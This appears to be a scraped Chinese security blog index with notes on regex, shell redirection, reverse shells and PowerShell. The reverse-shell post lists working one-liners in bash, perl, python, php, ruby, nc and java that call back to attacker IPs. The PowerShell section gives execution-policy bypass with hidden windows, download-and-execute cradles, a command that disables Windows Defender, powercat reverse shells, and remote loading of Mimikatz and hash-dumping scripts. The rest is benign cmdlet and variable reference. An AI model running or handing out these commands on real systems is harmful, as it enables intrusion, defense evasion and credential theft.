常用于执行一个全局搜索匹配, 即(不仅仅返回第一个匹配的, 而是返回全部). 例如, 表达式 /.(at)/g 表示搜索 任意字符(除了换行) + at, 并返回全部结果. 1&quot;/.(at)/&quot; =&gt; The fat cat sat on the mat. 在线练习 1&quot;/.(at)/g&quot; =&gt; The fat cat sat on the mat. 在线练习 多行修饰符 (Multiline)多行修饰符 m 常用于执行一个多行匹配. 像之前介绍的 (^,$) 用于检查格式是否是在待检测字符串的开头或结尾. 但我们如果想要它在每行的开头和结尾生效, 我们需要用到多行修饰符 m. 例如, 表达式 /at(.)?$/gm 表示小写字符 a 后跟小写字符 t , 末尾可选除换行符外任意字符. 根据 m 修饰符, 现在表达式匹配每行的结尾. 123&quot;/.at(.)?$/&quot; =&gt; The fat cat sat on the mat. 在线练习 123&quot;/.at(.)?$/gm&quot; =&gt; The fat cat sat on the mat. 在线练习 贪婪匹配与惰性匹配 (Greedy vs lazy matching)正则表达式默认采用贪婪匹配模式，在该模式下意味着会匹配尽可能长的子串。我们可以使用 ? 将贪婪匹配模式转化为惰性匹配模式。 1&quot;/(.*at)/&quot; =&gt; The fat cat sat on the mat. 在线练习 1&quot;/(.*?at)/&quot; =&gt; The fat cat sat on the mat. 在线练习","link":"/2019/10/07/regularexpression/"},{"title":"文件描述符、输入输出重定向及反弹shell","text":"包含常见的反弹shell 文件描述符linux启动时会默认打开三个文件描述符：标准输入（stdin，0）、标准输出（stdout，1）、标准错误（stderr，2），所有的输入输出都由该进程打开的文件描述符控制。 stdin默认绑定键盘，stdout和stderr默认绑定显示器。 当不是从键盘输入时，或者不是输出到显示器时，需要重定向。 重定向bash在执行命令时，先检查命令中是否存在重定向符号，如果时，先将文件描述符重定向，再去除重定向符号，最后执行命令，重定向从左至右解析。 输入重定向&lt;，输出重定向&gt;（覆盖），&gt;&gt;（追加）。 &lt;是对标准输入0重定向，&gt;和&gt;&gt;是对标准输出1重定向。 &amp;&gt;，将标准输出和标准错误都重定向，等价于&gt; ... 2&gt;&amp;1。&gt;将输出重定向，2&gt;&amp;1将错误绑定到标准输出的文件描述符，&amp;是为了说明要重定向到代表标准输出的1，而不是文件名是1的一个文件。 [n]&lt;&amp;[m]和[n]&gt;&amp;[m]都表示把文件描述符n复制到m，个人认为第二种比较好理解。 反弹shell反弹shell就是在攻击机上打开一个端口，等待受害者连接来进行控制。有时对方有防火墙，或者在局域网内无法直接连接，就可以通过反弹shell来连接。本质是把输入、输出和错误都重定向到服务端（攻击机）。 假设攻击机IP 192.168.1.4，受害者IP 192.168.1.5 在攻击者机器上执行 1nc -lvp 4444 在受害者机器上执行 1bash -i &gt;&amp; /dev/tcp/192.168.1.4/4444 0&gt;&amp;1 就拿到了一个反弹shell。 bash -i表示产生一个交互式的bash &gt;&amp; /dev/tcp/192.168.1.4/4444，linux的/dev下存放的是设备文件，本例中是攻击机监听的端口，&gt;&amp;是把标准输出和标准错误重定向到攻击机监听的端口。 0&gt;&amp;1表示把标准输入绑定到标准输出（/dev/tcp/192.168.1.4/4444） 以上就完成了一个经典的反弹shell 常见的反弹shell命令bash版本：1bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1 注意某些linux不支持 perl版本:1perl -e 'use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};' python版本：1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' php版本：1php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);' ruby版本：1ruby -rsocket -e'f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)' nc版本：1234567nc -e /bin/sh 10.0.0.1 1234rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1nc 10.0.0.1 1234 &gt;/tmp/fnc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999 java版本1234r = Runtime.getRuntime()p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])p.waitFor() 来源：https://p0sec.net/","link":"/2020/01/21/reverse-shell/"},{"title":"Powershell笔记","text":"Powershell中文博客 笔记 Powershell 安全问题基础各操作系统对应的Powershell版本 操作系统 版本 Windows 7, Windows Server 2008 2.0 Windows 8, Windows Server 2012 3.0 Windows 8.1, Windows Server 2012 R2 4.0 Windows 10, Windows Server 2016 5.0 Powershell 文件的后缀名为 .ps1，Windows 7 以上系统默认安装，无需写到磁盘中，可以直接在内存运行，可以从其它系统下载 Powershell 脚本执行，很多杀软检测不到 Powershell 的活动，Powershell 可以用于管理活动目录。 使用 Ctrl+R ，输入 powershell 调出 Powershell，或者在 cmd 下 输入 powershell 进入。cmd 下也可以直接输入 powershell 命令，格式为powershell [command]。 执行策略Powershell 中有一个执行策略，用于防止恶意脚本的执行，默认设置为受限，用Get-ExecutionPolicy命令查看执行策略，有4个策略：Restricted，脚本不能运行（默认）；RemoteSigned，本地脚本可以运行，从网上下载的脚本中拥有数字证书签名的可以运行；AllSigned，当脚本由受信任的发布者签名时可以运行；Unrestricted，所有脚本都可以运行。使用Set-ExecutionPolicy [policy]，可以修改执行策略。 渗透测试时，需要一些方法绕过策略执行 Powershell 脚本，在 cmd 窗口下执行远程下载的 Powershell 脚本不受策略影响，都可以执行；在 powershell 窗口下受策略限制。 12# cmdpowershell -c IEX (New-Object System.Net.Webclient).DownloadString('http://a.com/test.ps1') 绕过本地权限执行上传 test.ps1 到目标主机，在 cmd 环境下，在目标主机本地当前目录执行脚本 12# cmdpowershell -exec bypass .\\test.ps1 隐藏并绕过权限执行 12# cmdpowershell.exe -exec bypass -W hidden -nop test.ps1 -exec bypass，ExecvtionPolicy Bypass，绕过执行安全策略，这个参数用于绕过安全保护规则。 -w hidden，WindowSytle Hidden，隐藏窗口。 -c，Command，执行 powershell 脚本。 -nop，NoProfile，控制台不加载用户的配置文件。 NoLogo，不显示版权标识。 -noni，NonInteractive，非交互模式。 Noexit，执行后不退出 shell，对于键盘记录等脚本非常重要。 -enc base64，编码为 base64。 文件操作123456789New-Item test -ItemType directoryRemove-Item testNew-Item test.txt -ItemType fileNew-Item test.txt -ItemType file -value &quot;hello&quot;Remove-Item test.txtGet-COntent test.txtSet-Content test.txt -Value &quot;world&quot;Add-Content test.txt -Value &quot;!&quot;Clear-Content test.txt 除了 Powershell 的 动词-名词 形式的命令外，还可以使用 cmd 和 Linux 命令 远程下载 powershell 脚本并执行需要管理员权限才能下载到 C 盘，以下命令都在 cmd 中执行 12345678910# 下载到 d:/test.exepowershell (new-object system.net.webclient).downloadfile('http://localhost/test.exe','d:/test.exe')# 下载到当前目录powershell (new-object system.net.webclient).downloadfile('http://localhost/test.exe','test.exe')# 下载到当前目录并执行powershell (new-object system.net.webclient).dowloadfile('http://localhost/test.exe','test.exe');start-process test.exe# 下载脚本并执行powershell -c IEX (New-Object System.Net.Weblient).DownloadString('http://localhost/test.ps1')# 下载脚本并带参数运行powershell IEX (New-Object System.Net.Webclient).DownloadString('http://localhost/test.ps1');test.ps1 -p 8080 -e cmd 常用 powershell 命令以下命令在 cmd 中执行 12345678910# 关闭 Windows Defender 防火墙（需要管理员权限）powershell Set-MpPreference -disablerealtimeMonitoring $true# 将远程文件下载到本地powershell (new-object system.net.webclient).downloadfile('http://localhost/test.exe','d:/test.exe')# 反弹 NC shellpowershell IEX (NEW-Object System.Net.Webclient).DownloadString('https://raw.githubsercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 192.68.1.4 -p 8888 -e cmd# 读取明文密码（需要管理员权限）powershell IEX (New-Object Net.Webclient).DownloadString('https://raw.githubsercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCerts# 读取密码 hash 值（需要管理员权限）powershell IEX (New-Object Net.Webclient).DownloadString('https://raw.githubsercontent.com/samratashok/nishang/master/Gather/Get-PasswordHashes.ps1');Get-PassHashes 利用下载文件的方法同样可以反弹 MSF shell 或者 CobaltStrike shell。 认识Powershell快捷键与cmd,bash等相似： 快捷键 功能 Esc 清空当前命令行 F2 自动补充历史命令至指定字符 F4 删除命令行至光标右边指定字符处 F7 对话框显示命令行历史记录 F8 检索包含指定字符的命令行历史记录 F9 根据命令行历史记录编号选择命令，可以通过F7查看 ↑/↓ 切换命令行历史记录 Ctrl+C 取消正在执行的命令 Ctrl+←/→ 在单词之间移动光标 Tab 自动补全命令 管道和重定向|把之前命令的输出作为之后命令的输入 重定向把命令的输出保存到文件中，&gt;为覆盖，&gt;&gt;为追加 Powershell交互式Powershell命令集cmdletscmdlets是Powershell的内部命令，cmdlet的类型名为System.Management.Automation.CmdletInfo，包含下列属性和方法： Name MemberType Definition Equals Method bool Equals(System.Object obj) GetHashCode Method int GetHashCode() GetType Method type GetType() ToString Method string ToString() CommandType Property System.Management.Automation.CommandTypes CommandType {get;} DefaultParameterSet Property System.String DefaultParameterSet {get;} Definition Property System.String Definition {get;} HelpFile Property System.String HelpFile {get;} ImplementingType Property System.Type ImplementingType {get;} Module Property System.Management.Automation.PSModuleInfo Module {get;} ModuleName Property System.String ModuleName {get;} Name Property System.String Name {get;} Noun Property System.String Noun {get;} OutputType Property System.Collections.ObjectModel.ReadOnlyCollection`1[[System.Management.Automation.PSTypeName, System.Management.Automation, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]] OutputType {get;} Parameters Property System.Collections.Generic.Dictionary`2[[System.String, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Management.Automation.ParameterMetadata, System.Management.Automation, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]] Parameters {get;} ParameterSets Property System.Collections.ObjectModel.ReadOnlyCollection`1[[System.Management.Automation.CommandParameterSetInfo, System.Management.Automation, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]] ParameterSets {get;} PSSnapIn Property System.Management.Automation.PSSnapInInfo PSSnapIn {get;} Verb Property System.String Verb {get;} Visibility Property System.Management.Automation.SessionStateEntryVisibility Visibility {get;set;} DLL ScriptProperty System.Object DLL {get=$this.ImplementingType.Assembly.Location;} HelpUri ScriptProperty System.Object HelpUri {get=try { # ok to cast CommandTypes enum to HelpCategory because string/indentifier for # cmdlet,function,filter,alias,externalscript is identical. # it is ok to fail for other enum values (i.e. for Application) $helpObject = get-help -Name ($this.Name) -Category (string) -ErrorAction SilentlyContinue# return first non-null uri (and try not to hit any strict mode things) if ($helpObject -eq $null) { return $null } if ($helpObject.psobject.properties[‘relatedLinks’] -eq $null) { return $null } if ($helpObject.relatedLinks.psobject.properties[‘navigationLink’] -eq $null) { return $null } $helpUri = [string]$( $helpObject.relatedLinks.navigationLink | %{ if ($.psobject.properties[‘uri’] -ne $null) { $.uri } } | ?{ $_ } | select -first 1 ) return $helpUri } catch {};} 全部cmdlets命令： Name ModuleName Help Add-Computer Microsoft.PowerShell.Management help Add-Content Microsoft.PowerShell.Management help Add-History Microsoft.PowerShell.Core help Add-Member Microsoft.PowerShell.Utility help Add-PSSnapin Microsoft.PowerShell.Core help Add-Type Microsoft.PowerShell.Utility help Checkpoint-Computer Microsoft.PowerShell.Management help Clear-Content Microsoft.PowerShell.Management help Clear-EventLog Microsoft.PowerShell.Management help Clear-History Microsoft.PowerShell.Core help Clear-Item Microsoft.PowerShell.Management help Clear-ItemProperty Microsoft.PowerShell.Management help Clear-Variable Microsoft.PowerShell.Utility help Compare-Object Microsoft.PowerShell.Utility help Complete-Transaction Microsoft.PowerShell.Management help Connect-WSMan Microsoft.WSMan.Management help ConvertFrom-Csv Microsoft.PowerShell.Utility help ConvertFrom-SecureString Microsoft.PowerShell.Security help ConvertFrom-StringData Microsoft.PowerShell.Utility help Convert-Path Microsoft.PowerShell.Management help ConvertTo-Csv Microsoft.PowerShell.Utility help ConvertTo-Html Microsoft.PowerShell.Utility help ConvertTo-SecureString Microsoft.PowerShell.Security help ConvertTo-Xml Microsoft.PowerShell.Utility help Copy-Item Microsoft.PowerShell.Management help Copy-ItemProperty Microsoft.PowerShell.Management help Debug-Process Microsoft.PowerShell.Management help Disable-ComputerRestore Microsoft.PowerShell.Management help Disable-PSBreakpoint Microsoft.PowerShell.Utility help Disable-PSSessionConfiguration Microsoft.PowerShell.Core help Disable-WSManCredSSP Microsoft.WSMan.Management help Disconnect-WSMan Microsoft.WSMan.Management help Enable-ComputerRestore Microsoft.PowerShell.Management help Enable-PSBreakpoint Microsoft.PowerShell.Utility help Enable-PSRemoting Microsoft.PowerShell.Core help Enable-PSSessionConfiguration Microsoft.PowerShell.Core help Enable-WSManCredSSP Microsoft.WSMan.Management help Enter-PSSession Microsoft.PowerShell.Core help Exit-PSSession Microsoft.PowerShell.Core help Export-Alias Microsoft.PowerShell.Utility help Export-Clixml Microsoft.PowerShell.Utility help Export-Console Microsoft.PowerShell.Core help Export-Counter Microsoft.PowerShell.Diagnostics help Export-Csv Microsoft.PowerShell.Utility help Export-FormatData Microsoft.PowerShell.Utility help Export-ModuleMember Microsoft.PowerShell.Core help Export-PSSession Microsoft.PowerShell.Utility help ForEach-Object Microsoft.PowerShell.Core help Format-Custom Microsoft.PowerShell.Utility help Format-List Microsoft.PowerShell.Utility help Format-Table Microsoft.PowerShell.Utility help Format-Wide Microsoft.PowerShell.Utility help Get-Acl Microsoft.PowerShell.Security help Get-Alias Microsoft.PowerShell.Utility help Get-AuthenticodeSignature Microsoft.PowerShell.Security help Get-ChildItem Microsoft.PowerShell.Management help Get-Command Microsoft.PowerShell.Core help Get-ComputerRestorePoint Microsoft.PowerShell.Management help Get-Content Microsoft.PowerShell.Management help Get-Counter Microsoft.PowerShell.Diagnostics help Get-Credential Microsoft.PowerShell.Security help Get-Culture Microsoft.PowerShell.Utility help Get-Date Microsoft.PowerShell.Utility help Get-Event Microsoft.PowerShell.Utility help Get-EventLog Microsoft.PowerShell.Management help Get-EventSubscriber Microsoft.PowerShell.Utility help Get-ExecutionPolicy Microsoft.PowerShell.Security help Get-FormatData Microsoft.PowerShell.Utility help Get-Help Microsoft.PowerShell.Core help Get-History Microsoft.PowerShell.Core help Get-Host Microsoft.PowerShell.Utility help Get-HotFix Microsoft.PowerShell.Management help Get-Item Microsoft.PowerShell.Management help Get-ItemProperty Microsoft.PowerShell.Management help Get-Job Microsoft.PowerShell.Core help Get-Location Microsoft.PowerShell.Management help Get-Member Microsoft.PowerShell.Utility help Get-Module Microsoft.PowerShell.Core help Get-PfxCertificate Microsoft.PowerShell.Security help Get-Process Microsoft.PowerShell.Management help Get-PSBreakpoint Microsoft.PowerShell.Utility help Get-PSCallStack Microsoft.PowerShell.Utility help Get-PSDrive Microsoft.PowerShell.Management help Get-PSProvider Microsoft.PowerShell.Management help Get-PSSession Microsoft.PowerShell.Core help Get-PSSessionConfiguration Microsoft.PowerShell.Core help Get-PSSnapin Microsoft.PowerShell.Core help Get-Random Microsoft.PowerShell.Utility help Get-Service Microsoft.PowerShell.Management help Get-TraceSource Microsoft.PowerShell.Utility help Get-Transaction Microsoft.PowerShell.Management help Get-UICulture Microsoft.PowerShell.Utility help Get-Unique Microsoft.PowerShell.Utility help Get-Variable Microsoft.PowerShell.Utility help Get-WinEvent Microsoft.PowerShell.Diagnostics help Get-WmiObject Microsoft.PowerShell.Management help Get-WSManCredSSP Microsoft.WSMan.Management help Get-WSManInstance Microsoft.WSMan.Management help Group-Object Microsoft.PowerShell.Utility help Import-Alias Microsoft.PowerShell.Utility help Import-Clixml Microsoft.PowerShell.Utility help Import-Counter Microsoft.PowerShell.Diagnostics help Import-Csv Microsoft.PowerShell.Utility help Import-LocalizedData Microsoft.PowerShell.Utility help Import-Module Microsoft.PowerShell.Core help Import-PSSession Microsoft.PowerShell.Utility help Invoke-Command Microsoft.PowerShell.Core help Invoke-Expression Microsoft.PowerShell.Utility help Invoke-History Microsoft.PowerShell.Core help Invoke-Item Microsoft.PowerShell.Management help Invoke-WmiMethod Microsoft.PowerShell.Management help Invoke-WSManAction Microsoft.WSMan.Management help Join-Path Microsoft.PowerShell.Management help Limit-EventLog Microsoft.PowerShell.Management help Measure-Command Microsoft.PowerShell.Utility help Measure-Object Microsoft.PowerShell.Utility help Move-Item Microsoft.PowerShell.Management help Move-ItemProperty Microsoft.PowerShell.Management help New-Alias Microsoft.PowerShell.Utility help New-Event Microsoft.PowerShell.Utility help New-EventLog Microsoft.PowerShell.Management help New-Item Microsoft.PowerShell.Management help New-ItemProperty Microsoft.PowerShell.Management help New-Module Microsoft.PowerShell.Core help New-ModuleManifest Microsoft.PowerShell.Core help New-Object Microsoft.PowerShell.Utility help New-PSDrive Microsoft.PowerShell.Management help New-PSSession Microsoft.PowerShell.Core help New-PSSessionOption Microsoft.PowerShell.Core help New-Service Microsoft.PowerShell.Management help New-TimeSpan Microsoft.PowerShell.Utility help New-Variable Microsoft.PowerShell.Utility help New-WebServiceProxy Microsoft.PowerShell.Management help New-WSManInstance Microsoft.WSMan.Management help New-WSManSessionOption Microsoft.WSMan.Management help Out-Default Microsoft.PowerShell.Utility help Out-File Microsoft.PowerShell.Utility help Out-GridView Microsoft.PowerShell.Utility help Out-Host Microsoft.PowerShell.Utility help Out-Null Microsoft.PowerShell.Utility help Out-Printer Microsoft.PowerShell.Utility help Out-String Microsoft.PowerShell.Utility help Pop-Location Microsoft.PowerShell.Management help Push-Location Microsoft.PowerShell.Management help Read-Host Microsoft.PowerShell.Utility help Receive-Job Microsoft.PowerShell.Core help Register-EngineEvent Microsoft.PowerShell.Utility help Register-ObjectEvent Microsoft.PowerShell.Utility help Register-PSSessionConfiguration Microsoft.PowerShell.Core help Register-WmiEvent Microsoft.PowerShell.Management help Remove-Computer Microsoft.PowerShell.Management help Remove-Event Microsoft.PowerShell.Utility help Remove-EventLog Microsoft.PowerShell.Management help Remove-Item Microsoft.PowerShell.Management help Remove-ItemProperty Microsoft.PowerShell.Management help Remove-Job Microsoft.PowerShell.Core help Remove-Module Microsoft.PowerShell.Core help Remove-PSBreakpoint Microsoft.PowerShell.Utility help Remove-PSDrive Microsoft.PowerShell.Management help Remove-PSSession Microsoft.PowerShell.Core help Remove-PSSnapin Microsoft.PowerShell.Core help Remove-Variable Microsoft.PowerShell.Utility help Remove-WmiObject Microsoft.PowerShell.Management help Remove-WSManInstance Microsoft.WSMan.Management help Rename-Item Microsoft.PowerShell.Management help Rename-ItemProperty Microsoft.PowerShell.Management help Reset-ComputerMachinePassword Microsoft.PowerShell.Management help Resolve-Path Microsoft.PowerShell.Management help Restart-Computer Microsoft.PowerShell.Management help Restart-Service Microsoft.PowerShell.Management help Restore-Computer Microsoft.PowerShell.Management help Resume-Service Microsoft.PowerShell.Management help Select-Object Microsoft.PowerShell.Utility help Select-String Microsoft.PowerShell.Utility help Select-Xml Microsoft.PowerShell.Utility help Send-MailMessage Microsoft.PowerShell.Utility help Set-Acl Microsoft.PowerShell.Security help Set-Alias Microsoft.PowerShell.Utility help Set-AuthenticodeSignature Microsoft.PowerShell.Security help Set-Content Microsoft.PowerShell.Management help Set-Date Microsoft.PowerShell.Utility help Set-ExecutionPolicy Microsoft.PowerShell.Security help Set-Item Microsoft.PowerShell.Management help Set-ItemProperty Microsoft.PowerShell.Management help Set-Location Microsoft.PowerShell.Management help Set-PSBreakpoint Microsoft.PowerShell.Utility help Set-PSDebug Microsoft.PowerShell.Core help Set-PSSessionConfiguration Microsoft.PowerShell.Core help Set-Service Microsoft.PowerShell.Management help Set-StrictMode Microsoft.PowerShell.Core help Set-TraceSource Microsoft.PowerShell.Utility help Set-Variable Microsoft.PowerShell.Utility help Set-WmiInstance Microsoft.PowerShell.Management help Set-WSManInstance Microsoft.WSMan.Management help Set-WSManQuickConfig Microsoft.WSMan.Management help Show-EventLog Microsoft.PowerShell.Management help Sort-Object Microsoft.PowerShell.Utility help Split-Path Microsoft.PowerShell.Management help Start-Job Microsoft.PowerShell.Core help Start-Process Microsoft.PowerShell.Management help Start-Service Microsoft.PowerShell.Management help Start-Sleep Microsoft.PowerShell.Utility help Start-Transaction Microsoft.PowerShell.Management help Start-Transcript Microsoft.PowerShell.Host help Stop-Computer Microsoft.PowerShell.Management help Stop-Job Microsoft.PowerShell.Core help Stop-Process Microsoft.PowerShell.Management help Stop-Service Microsoft.PowerShell.Management help Stop-Transcript Microsoft.PowerShell.Host help Suspend-Service Microsoft.PowerShell.Management help Tee-Object Microsoft.PowerShell.Utility help Test-ComputerSecureChannel Microsoft.PowerShell.Management help Test-Connection Microsoft.PowerShell.Management help Test-ModuleManifest Microsoft.PowerShell.Core help Test-Path Microsoft.PowerShell.Management help Test-WSMan Microsoft.WSMan.Management help Trace-Command Microsoft.PowerShell.Utility help Undo-Transaction Microsoft.PowerShell.Management help Unregister-Event Microsoft.PowerShell.Utility help Unregister-PSSessionConfiguration Microsoft.PowerShell.Core help Update-FormatData Microsoft.PowerShell.Utility help Update-List Microsoft.PowerShell.Utility help Update-TypeData Microsoft.PowerShell.Utility help Use-Transaction Microsoft.PowerShell.Management help Wait-Event Microsoft.PowerShell.Utility help Wait-Job Microsoft.PowerShell.Core help Wait-Process Microsoft.PowerShell.Management help Where-Object Microsoft.PowerShell.Core help Write-Debug Microsoft.PowerShell.Utility help Write-Error Microsoft.PowerShell.Utility help Write-EventLog Microsoft.PowerShell.Management help Write-Host Microsoft.PowerShell.Utility help Write-Output Microsoft.PowerShell.Utility help Write-Progress Microsoft.PowerShell.Utility help Write-Verbose Microsoft.PowerShell.Utility help Write-Warning Microsoft.PowerShell.Utility help 别名可以通过函数扩展别名 调用入口优先级别名：控制台首先会寻找输入是否为一个别名，如果是，执行别名所指的命令。因此我们可以通过别名覆盖任意powershell命令，因为别名的优先级最高。 函数：如果没有找到别名，会继续寻找函数，函数类似别名，只不过它包含了更多的powershell命令。因此可以自定义函数扩充cmdlet 把常用的参数给固化进去。 命令：如果没有找到函数，控制台会继续寻找命令，即cmdlet，powershell的内部命令。 脚本：没有找到命令，继续寻找扩展名为“.ps1”的Powershell脚本。 文件：没有找到脚本，会继续寻找文件，如果没有可用的文件，控制台会抛出异常 变量变量操作不必声明，可以直接使用。前缀为$，大小写不敏感。一些特殊字符如果用作变量名应用花括号括起来。 可以连续赋值，也可以使用元祖赋值，比如$a,$b=$b,$a。 变量的相关信息被记录在variable驱动中，可以通过遍历variable:得到。ls variable:，还可以像查找文件一样使用通配符查找变量，例如查找value开头的变量。ls variable:value*。 验证变量是否存在，可以像验证文件系统一样使用cmdlet Test-Path，因为变量存在变量驱动器中。Test-Path variable:value1 Powershell退出时自动删除变量，也可以手动删除。del variable:value1 有五个专用的管理变量cmdlet，Clear-Variable,Get-Variable,New-Variable,Remove-Variable,Set-Variable。其中Get-Variable,New-Variable，可以获得或者指定一些变量的属性。New-Variable的-option可以加上readonly或者constant属性，也可以用-description添加描述，但是默认不显示，可以通过Format-List查看。new-variable name -Value &quot;me&quot; -description &quot;this is my name&quot; -option readonly。 自动化变量指打开powershell时自动加载的变量，一般包括用户信息，配置信息，运行时信息等。 某些自动化变量是只读的。列表： $$包含会话所收到的最后一行中的最后一个令牌。 $?包含最后一个操作的执行状态。如果最后一个操作成功，则包含 TRUE，失败则包含 FALSE。 $^包含会话所收到的最后一行中的第一个令牌。 $_包含管道对象中的当前对象。在对管道中的每个对象或所选对象执行操作的命令中，可以使用此变量。 $Args包含由未声明参数和/或传递给函数、脚本或脚本块的参数值组成的数组。在创建函数时可以声明参数，方法是使用 param 关键字或在函数名称后添加以圆括号括起、逗号分隔的参数列表。 $ConsoleFileName包含在会话中最近使用的控制台文件 (.psc1) 的路径。在通过 PSConsoleFile 参数启动Windows PowerShell 或使用 Export-Console cmdlet 将管理单元名称导出到控制台文件时，将填充此变量。 在使用不带参数的 Export-Console cmdlet 时，它自动更新在会话中最近使用的控制台文件。可以使用此自动变量确定要更新的文件。 $Error包含错误对象的数组，这些对象表示最近的一些错误。最近的错误是该数组中的第一个错误对象($Error[0])。 $Event包含一个 PSEventArgs 对象，该对象表示一个正在被处理的事件。此变量只在事件注册命令（例如 Register-ObjectEvent）的 Action 块内填充。此变量的值是 Get-Event cmdlet 返回的同一个对象。因此，可以在 Action 脚本块中使用 $Event 变量的属性（例如$Event.TimeGenerated）。 $EventSubscriber包含一个 PSEventSubscriber 对象，该对象表示正在被处理的事件的事件订阅者。此变量只在事件注册命令的 Action 块内填充。此变量的值是 Get-EventSubscriber cmdlet 返回的同一个对象。 $ExecutionContext包含一个 EngineIntrinsics 对象，该对象表示 Windows PowerShell 主机的执行上下文。可以使用此变量来查找可用于 cmdlet 的执行对象。 $False包含 FALSE。可以使用此变量在命令和脚本中表示 FALSE，而不是使用字符串”false”。如果该字符串转换为非空字符串或非零整数，则可将该字符串解释为 TRUE。 $ForEach包含 ForEach-Object 循环的枚举数。可以对 $ForEach 变量的值使用枚举数的属性和方法。此变量仅在运行 For 循环时存在，循环完成即会删除。 $Home包含用户的主目录的完整路径。此变量等效于 %homedrive%%homepath% 环境变量。 $Host包含一个对象，该对象表示 Windows PowerShell 的当前主机应用程序。可以使用此变量在命令中表示当前主机，或者显示或更改主机的属性，如 $Host.version、$Host.CurrentCulture或 $host.ui.rawui.setbackgroundcolor(“Red”)。 $Input一个枚举数，它包含传递给函数的输入。$Input 变量区分大小写，只能用于函数和脚本块。（脚本块本质上是未命名的函数。）在函数的 Process 块中，$Input 变量包含当前位于管道中的对象。在 Process 块完成后，$Input 的值为 NULL。如果函数没有 Process 块，则 $Input的值可用于 End 块，它包含函数的所有输入。 $LastExitCode包含运行的最后一个基于 Windows 的程序的退出代码。 $Matches$Matches 变量与 -match 和 -not match 运算符一起使用。将标量输入提交给 -match 或 -notmatch 运算符时，如果检测到匹配，则会返回一个布尔值，并使用由所有匹配字符串值组成的哈希表填充 $Matches 自动变量。有关 -match 运算符的详细信息，请参阅 about_comparison_operators。 $MyInvocation包含一个对象，该对象具有有关当前命令（如脚本、函数或脚本块）的信息。可以使用该对象中的信息（如脚本的路径和文件名 ($myinvocation.mycommand.path) 或函数的名称($myinvocation.mycommand.name)）来标识当前命令。对于查找正在运行的脚本的名称，这非常有用。 $NestedPromptLevel包含当前提示级别。值 0 指示原始提示级别。该值在进入嵌套级别时递增，在退出嵌套级别时递减。 例如，在使用 $Host.EnterNestedPrompt 方法时，Windows PowerShell 会出现嵌套命令提示符。在 Windows PowerShell 调试程序中到达断点时，Windows PowerShell 也会出现嵌套命令提示符。 在进入嵌套提示时，Windows PowerShell 暂停当前命令，保存执行上下文，并递增$NestedPromptLevel 变量的值。要创建更多嵌套命令提示符（最多 128 级）或返回到原始命令提示符，请完成命令，或键入”exit”。 $NestedPromptLevel 变量有助于跟踪提示级别。可以创建包含此值的备用 WindowsPowerShell 命令提示符，以使此值始终可见。 $NULL包含 NULL 或空值。可以在命令和脚本中使用此变量表示 NULL，而不是使用字符串”NULL”。如果该字符串转换为非空字符串或非零整数，则可将该字符串解释为 TRUE。 $PID包含承载当前 Windows PowerShell 会话的进程的进程标识符 (PID)。 $Profile包含当前用户和当前主机应用程序的 Windows PowerShell 配置文件的完整路径。可以在命令中使用此变量表示配置文件。例如，可以在命令中使用此变量确定是否已创建某个配置文件： test-path $profile 也可以在命令中使用此变量创建配置文件： new-item -type file -path $pshome -force 此外，还可以在命令中使用此变量在记事本中打开配置文件： notepad $profile $PSBoundParameters包含活动参数及其当前值的字典。只有在声明参数的作用域（如脚本或函数）中，此变量才有值。可以使用此变量显示或更改参数的当前值，也可以将参数值传递给其他脚本或函数。 例如： function test {param($a, $b) # Display the parameters in dictionary format.$psboundparameters # Call the Test1 function with $a and $b.test1 @psboundparameters**}** $PsCmdlet包含一个对象，该对象表示正在运行的 cmdlet 或高级函数。 可以在 cmdlet 或函数代码中使用该对象的属性和方法来响应使用的条件。例如，ParameterSetName 属性包含正在使用的参数集的名称，而 ShouldProcess 方法将 WhatIf和 Confirm 参数动态添加到 cmdlet。 有关 $PSCmdlet 自动变量的详细信息，请参阅 about_Functions_Advanced。 $PsCulture包含操作系统中当前所用的区域性的名称。区域性确定数字、货币和日期等项的显示格式。这是系统的 System.Globalization.CultureInfo.CurrentCulture.Name 属性的值。要获取系统的 System.Globalization.CultureInfo 对象，请使用 Get-Culture cmdlet。 $PSDebugContext在调试期间，此变量包含有关调试环境的信息。在其他时间，此变量包含 NULL 值。因此，可以使用此变量指示调试程序是否拥有控制权。填充之后，此变量包含一个具有 Breakpoints 和InvocationInfo 属性的 PsDebugContext 对象。InvocationInfo 属性有多个十分有用的属性，包括 Location 属性。Location 属性指示正在调试的脚本的路径。 $PsHome包含 Windows PowerShell 的安装目录的完整路径（通常为%windir%System32WindowsPowerShellv1.0）。可以在 Windows PowerShell 文件的路径中使用此变量。例如，下面的命令在概念性帮助主题中搜索”variable”一词： select-string -pattern variable -path $pshome*.txt 